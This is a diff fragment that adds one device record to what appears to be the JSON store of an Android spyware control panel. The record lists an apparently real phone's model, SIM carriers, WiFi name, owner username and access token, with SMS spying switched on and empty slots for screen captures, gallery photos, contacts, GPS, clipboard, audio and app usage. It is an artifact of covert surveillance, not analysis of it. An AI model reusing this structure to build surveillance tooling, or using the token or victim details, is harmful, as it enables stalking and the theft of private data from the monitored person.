@@ -11612,5 +11612,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_d85200dc",
+    "deviceName": "HP-AMBONV2-0FAF",
+    "ownerUsername": "gehgtg17",
+    "token": "7fbcd2650ba9cf5ce36f05d0004ee8a1",
+    "lastSeen": 1776901806977,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-22T23:50:06.977Z",
+    "deviceInfo": {
+      "model": "vivo vivo Y17",
+      "androidVersion": "Android 9",
+      "battery": 75,
+      "network": "WiFi: YANG BACA ANJING",
+      "sim1": "Smartfren 100% untuk Indonesia — smartfren",
+      "sim2": "Smartfren"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
